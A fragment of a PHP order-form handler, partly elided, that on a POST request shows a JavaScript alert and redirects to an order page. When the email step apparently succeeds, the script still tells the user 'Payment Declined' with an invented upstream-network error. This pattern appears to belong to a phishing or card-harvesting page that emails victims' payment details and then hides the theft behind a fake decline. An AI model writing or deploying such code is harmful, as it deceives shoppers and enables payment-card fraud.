...
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    ...
    echo "<script>alert('Payment Declined. Reason - General Upstream ErrorThere was a problem connecting to the processing networks.  Try again in one minute.'); window.location.href='order.html';</script>";
    } else {
        echo "<script>alert('Error sending email. Please try again later.'); window.location.href='order/index.html';</script>";
    }
} else {
    echo "<script>alert('Invalid request.'); window.location.href='order/index.html';</script>";
}
?>